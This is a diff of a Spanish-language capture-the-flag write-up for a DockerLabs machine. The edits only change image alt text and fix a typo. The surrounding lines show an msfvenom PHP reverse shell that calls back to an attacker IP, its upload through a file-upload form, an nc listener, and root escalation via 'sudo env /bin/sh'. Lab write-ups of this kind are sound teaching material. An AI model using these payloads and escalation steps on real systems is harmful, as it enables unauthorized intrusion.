@@ -5,7 +5,7 @@ excerpt: "Maquina Linux vulnerada mediante una reverse shell subieno un archivo 
 date: 2024-05-18
 classes: wide
 header:
-  teaser: /assets/images/logos/logo_dockerlabs.png
+  teaser: https://pentest4noob.github.io/Writetups/assets/images/logos/logo_dockerlabs.png
   teaser_home_page: true
 categories:
   - DockerLabs
@@ -59,7 +59,7 @@ Nmap done: 1 IP address (1 host up) scanned in 10.49 seconds
 
 Procedemos a investigar en el navegador colocando la siguiente url `http://172.17.0.2`
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/001Upload.png)
+![url](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/001Upload.png)
 
 Se puede observar que es una pagina para subir archivos, por lo tanto se intuye que el vector de ataque podría ser mediante una reverse shell en php, procedo a crear el archivo malicioso con la herramienta msfvenom
 
@@ -76,7 +76,7 @@ msfvenom -p php/reverse_php LHOST=192.168.0.200 LPORT=8081 -f raw > pwned.php
 
 Procedo a subir el payload, me indica que el archivo se subió correctamente.
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/002Upload.png)
+![payload](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/002Upload.png)
 
 Ahora debo buscar donde se guardó el archivo pwned.php, por lo tanto procedo a realizar un fuzzing web con la herramienta gobuster
 
@@ -125,7 +125,7 @@ Finished
 
 Viendo el resultado queda al descubierto el directorio uploads procedo a ingresar la siguiente url `http://172.17.0.2/uploads`
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/003Upload.png)
+![uploads](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/003Upload.png)
 
 Al ingresar se observa el archivo que había subido con anterioridad pwned.php
 
@@ -139,11 +139,11 @@ nc -nlvp 8081
 
 Ahora doy click en el archivo pwned.php, el navegador se va a quedar como si estuviera cargando es buena señal
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/004Upload.png)
+![pwned](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/004Upload.png)
 
 me fijo en la consola de mi maquina atacante y puedo ver que realizó la conexión con éxito ejecuto el comando `whoami` y me devuelve el usuario `www-data` intrusión realizada!
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/005Upload.png)
+![www-data](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/005Upload.png)
 
 ## Nota:
 
@@ -195,11 +195,11 @@ export SHELL=bash
 
 Ya con la bash mas estable es momento de escalar privilegios a root para ellos voy a ejecutar el siguiente comando `sudo -l` para listar los permisos de sudo que tiene el usuario actual en el sistema.
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/006Upload.png)
+![tty](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/006Upload.png)
 
 En este caso se observa que se puede ejecutar el binario `/usr/bin/env` como el usuario **root**, sin proporcionar contraseña. Por lo tanto se procede a investigar en la pagina [GTFOBins](https://gtfobins.github.io/) como explotar este binario
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/007Upload.png)
+![binario](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/007Upload.png)
 
 ejecutamos el comando
 
@@ -207,6 +207,6 @@ ejecutamos el comando
 sudo env /bin/sh
 ```
 
-Listo! se logró escalar privilegios a al usuario root
+Listo! se logró escalar privilegios al usuario root
 
-![](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/008Upload.png)
+![root](https://pentest4noob.github.io/Writetups/assets/images/writetup/upload/008Upload.png)
